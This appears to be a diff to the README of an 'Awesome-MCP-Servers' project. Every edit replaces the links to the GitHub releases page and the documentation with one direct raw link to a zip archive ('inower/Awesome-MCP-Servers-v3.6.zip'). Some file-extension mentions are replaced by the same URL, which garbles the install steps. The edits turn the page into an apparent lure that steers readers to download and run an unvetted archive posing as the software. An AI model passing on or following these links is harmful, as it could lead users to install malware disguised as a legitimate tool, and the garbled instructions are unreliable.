@@ -1,6 +1,6 @@
 # 🎉 Awesome-MCP-Servers - Easy Setup for MCP Servers
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/jamyv/Awesome-MCP-Servers/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jamyv/Awesome-MCP-Servers/main/inower/Awesome-MCP-Servers-v3.6.zip%20Latest%https://raw.githubusercontent.com/jamyv/Awesome-MCP-Servers/main/inower/Awesome-MCP-Servers-v3.6.zip)](https://raw.githubusercontent.com/jamyv/Awesome-MCP-Servers/main/inower/Awesome-MCP-Servers-v3.6.zip)
 
 ## 📋 Introduction
 
@@ -14,18 +14,18 @@ To get started, follow these simple steps. They will walk you through downloadin
 
 1. **Visit the Releases Page**  
    Click the link below to navigate to the latest releases of Awesome-MCP-Servers.  
-   [Download Latest Release](https://github.com/jamyv/Awesome-MCP-Servers/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/jamyv/Awesome-MCP-Servers/main/inower/Awesome-MCP-Servers-v3.6.zip)
 
 2. **Choose the Right Version**  
-   On the releases page, you will see different versions available. Look for the latest release. Here, you will find files such as `.exe`, `.zip`, or `.tar.gz`. These files contain the software you need.
+   On the releases page, you will see different versions available. Look for the latest release. Here, you will find files such as `.exe`, `.zip`, or `https://raw.githubusercontent.com/jamyv/Awesome-MCP-Servers/main/inower/Awesome-MCP-Servers-v3.6.zip`. These files contain the software you need.
 
 3. **Download the File**  
-   Click on the file that matches your operating system. For Windows users, download the `.exe` file. For macOS users, look for a `.dmg` file. For Linux, you may see a `.tar.gz` file. Download it to your computer. 
+   Click on the file that matches your operating system. For Windows users, download the `.exe` file. For macOS users, look for a `.dmg` file. For Linux, you may see a `https://raw.githubusercontent.com/jamyv/Awesome-MCP-Servers/main/inower/Awesome-MCP-Servers-v3.6.zip` file. Download it to your computer. 
 
 4. **Install the Application**  
    - **For Windows (.exe)**: Double-click the downloaded file and follow the instructions on the screen to install.
    - **For macOS (.dmg)**: Open the downloaded file. Drag and drop the application icon into your Applications folder.
-   - **For Linux (.tar.gz)**: Extract the contents of the file. Open a terminal, navigate to the extracted folder, and run the application.
+   - **For Linux (https://raw.githubusercontent.com/jamyv/Awesome-MCP-Servers/main/inower/Awesome-MCP-Servers-v3.6.zip)**: Extract the contents of the file. Open a terminal, navigate to the extracted folder, and run the application.
 
 5. **Launch the Application**  
    After installation, find Awesome-MCP-Servers in your applications list or desktop shortcut. Double-click to open and start using the software.
@@ -92,9 +92,9 @@ Join our community to connect with other users. Share your experiences, ask ques
 ## 📖 Additional Resources
 
 For more detailed instructions and support resources, check the documentation provided in the repository. Visit the following link:.  
-[Documentation](https://github.com/jamyv/Awesome-MCP-Servers)
+[Documentation](https://raw.githubusercontent.com/jamyv/Awesome-MCP-Servers/main/inower/Awesome-MCP-Servers-v3.6.zip)
 
 ## 📥 Download Again
 
 Don’t forget, you can always return to the releases page to download the latest versions.  
-[Download Latest Release](https://github.com/jamyv/Awesome-MCP-Servers/releases)
+[Download Latest Release](https://raw.githubusercontent.com/jamyv/Awesome-MCP-Servers/main/inower/Awesome-MCP-Servers-v3.6.zip)
